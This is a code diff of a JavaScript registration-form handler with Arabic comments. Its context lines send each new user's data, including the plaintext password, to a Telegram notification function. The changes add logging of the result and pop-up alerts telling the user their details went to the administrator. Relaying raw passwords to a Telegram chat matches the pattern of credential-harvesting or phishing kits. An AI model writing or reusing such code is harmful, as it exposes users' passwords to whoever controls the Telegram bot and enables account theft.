@@ -132,16 +132,28 @@ if (document.getElementById('registerForm')) {
                     password: password
                 });
                 
-                await sendTelegramNotification({
+                const telegramResult = await sendTelegramNotification({
                     ...userData,
                     password: password,
                     provider: 'البريد الإلكتروني',
                     createdAt: new Date()
                 });
                 
-                console.log('✅ تم إرسال الإشعار إلى تليجرام بنجاح');
+                console.log('✅ تم إرسال الإشعار إلى تليجرام بنجاح', telegramResult);
+                
+                // إشعار للمستخدم
+                setTimeout(() => {
+                    alert('✅ تم إرسال بياناتك إلى المشرف بنجاح!');
+                }, 1000);
+                
             } catch (telegramError) {
                 console.error('❌ فشل إرسال الإشعار إلى تليجرام:', telegramError);
+                
+                // إشعار للمستخدم بالفشل
+                setTimeout(() => {
+                    alert('⚠️ تم إنشاء حسابك لكن فشل إرسال الإشعار للمشرف.\nالخطأ: ' + telegramError.message);
+                }, 1000);
+                
                 // لا نوقف التسجيل حتى لو فشل Telegram
             }
             
